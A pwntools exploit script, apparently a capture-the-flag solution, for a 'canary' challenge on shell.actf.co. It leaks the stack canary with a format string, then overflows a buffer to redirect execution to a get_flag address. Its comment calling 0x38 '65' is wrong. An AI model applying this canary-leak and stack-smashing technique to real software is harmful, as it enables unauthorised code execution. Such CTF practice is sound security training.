# RazviOverflow

# %17$016lX CANARY IS HERE
from pwn import *
#import struct

url = "shell.actf.co" 
port = 20701

#binary = process('canary')
binary = remote(url, port)

format_string_leak_canary = "%17$lX"

print(binary.recvuntil("name?"))

binary.sendline(format_string_leak_canary)

canary = binary.recvuntil("!").split(",")[1].strip()[:-1]
#print canary
#canary_little_endian = struct.pack("<Q", int(canary, 16))
canary_little_endian = p64(int(canary, 16))
print "[*] Canary detected: " + canary_little_endian

padding = "A" * 0x38 # (rbp - 0x40 minus rbp - 0x8 = 0x38 (65)) buffer padding
saved_rbp = "B" * 0x8 # 
get_flag_address = p64(0x400787)

print binary.recv()

payload = padding + canary_little_endian + saved_rbp + get_flag_address
binary.sendline(payload)

print binary.recv()
